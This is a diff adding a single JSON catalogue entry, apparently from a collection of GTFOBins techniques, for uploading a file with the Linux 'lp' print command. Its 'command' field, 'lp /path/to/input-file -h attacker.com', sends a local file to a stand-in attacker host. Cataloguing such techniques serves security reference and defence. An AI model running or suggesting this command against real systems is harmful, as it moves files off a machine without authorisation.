@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-lp-upload",
+  "name": "GTFOBins · lp (upload)",
+  "command": "lp /path/to/input-file -h attacker.com",
+  "description": "Use lp to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "lp",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/lp/#upload",
+  "upstream_id": "lp/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/lp/"
+    }
+  ]
+}
